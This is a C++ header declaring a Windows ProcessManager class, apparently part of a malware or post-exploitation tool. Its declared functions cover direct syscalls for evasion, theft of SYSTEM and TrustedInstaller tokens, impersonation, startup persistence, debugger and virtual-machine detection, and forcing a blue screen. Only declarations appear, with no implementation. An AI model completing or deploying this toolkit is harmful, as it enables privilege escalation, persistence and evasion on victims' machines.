#pragma once

#include "Win32Natives.h"

#include <any>
#include <string>
#include <unordered_map>
#include <iostream>
#include "Syscalls.h"

extern "C" void* GetPebAddress(); // Get the address of the current processes PEB.
extern "C" void* InsertSyscall(unsigned int ssn);

// dynamically loaded dlls
inline HMODULE Kernel32DLL = nullptr;
inline HMODULE NTDLL       = nullptr;
inline HMODULE AdvApi32DLL = nullptr;
inline bool    DllsLoaded  = false;

template <typename fp>
struct FunctionPointer {
    fp          call;
    std::string name;
    HMODULE     from;
};

enum class SecurityContext {
    User,
    Admin,
    System,
    TrustedInstaller,
    Highest = TrustedInstaller,
};

class ProcessManager {
public:
    ProcessManager();

    inline const SecurityContext GetProcessSecurityContext() const { return this->m_Context; }
    HMODULE            GetLoadedLib(const std::string& libName);                    // Return a handle of an already loaded dll from 'loadedDlls'
    BOOL               FreeUsedLibrary(const std::string& lib);                     // Free a loaded library 'lib'
    static void        ShutdownSystem(SHUTDOWN_ACTION type);
    DWORD              PIDFromName(const char* name);                               // Get the process ID from a process name.
    HANDLE             ImpersonateWithToken(HANDLE token);                          // Impersonate security context of 'token' for this thread
    HANDLE             CreateProcessAccessToken(DWORD processID, bool ti=false);    // Duplicate a process security token from the process id
    DWORD              StartWindowsService(const std::string& serviceName);         // Start a Windows service 'serviceName'—return process id.
    HANDLE             GetSystemToken();                                            // Get a SYSTEM permissions security token from winlogon.exe.
    HANDLE             GetTrustedInstallerToken();                                  // Obtain a Trusted Installer security token.
    static bool        BeingDebugged();                                             // Check if the current process is being debugged by looking at PEB
    void               BSOD();                                                      // Cause a blue screen of death on the current machine
    inline HANDLE      GetToken() const { return this->m_ElevatedToken; }
    static UINT        GetSSN(HMODULE lib, std::string functionName);
    void               AddProcessToStartup(std::string path);
    bool               RunningInVirtualMachine();
    static void        GetAndInsertSSN(HMODULE lib, std::string functionName);
    static FARPROC     GetFunctionAddressInternal(HMODULE lib, std::string procedure); // Get a function pointer to an export function 'procedure' located in 'lib'
    BOOL               OpenProcessAsImposter(HANDLE token, 
                                             DWORD dwLogonFlags, 
                                             LPCWSTR lpApplicationName, 
                                             LPWSTR lpCommandLine, 
                                             DWORD dwCreationFlags, 
                                             LPVOID lpEnvironment, 
                                             LPCWSTR lpCurrentDirectory, 
                                             bool saveOutput, 
                                             std::string& cmdOutput);

    template <typename fp>
    inline const FunctionPointer<fp> GetNative(char* name) {
        if ( !this->m_Natives.contains(name) )
            return {};

        return std::any_cast< FunctionPointer<fp> >( this->m_Natives.at(name) );
    }

    template <typename fpType>
    static inline fpType GetFunctionAddress(HMODULE lib, const std::string& proc) {
        return reinterpret_cast< fpType >( GetFunctionAddressInternal(lib, proc) );
    }
    
    template <typename fpType, typename ...Args>
    static inline auto Call(HMODULE lib, std::string name, Args&&... args) noexcept {
        return GetFunctionAddress<fpType>(lib, name)( std::forward<Args>(args)... );
    }

private:
    inline static std::unordered_map<std::string, std::any> m_Natives; // native function pointers
    std::unordered_map<std::string, HMODULE> m_LoadedDLLs;
    BOOL               m_NativesLoaded    = FALSE;
    SecurityContext    m_Context          = SecurityContext::Admin;
    HANDLE             m_ElevatedToken    = NULL;

    template <typename type>
    void               LoadNative(char* name, HMODULE from);
    void               LoadAllNatives();
    HMODULE            GetLoadedModule(std::string libName); // Get the handle of a dll 'libname'};
    void               SetThisContext(SecurityContext newContext);
};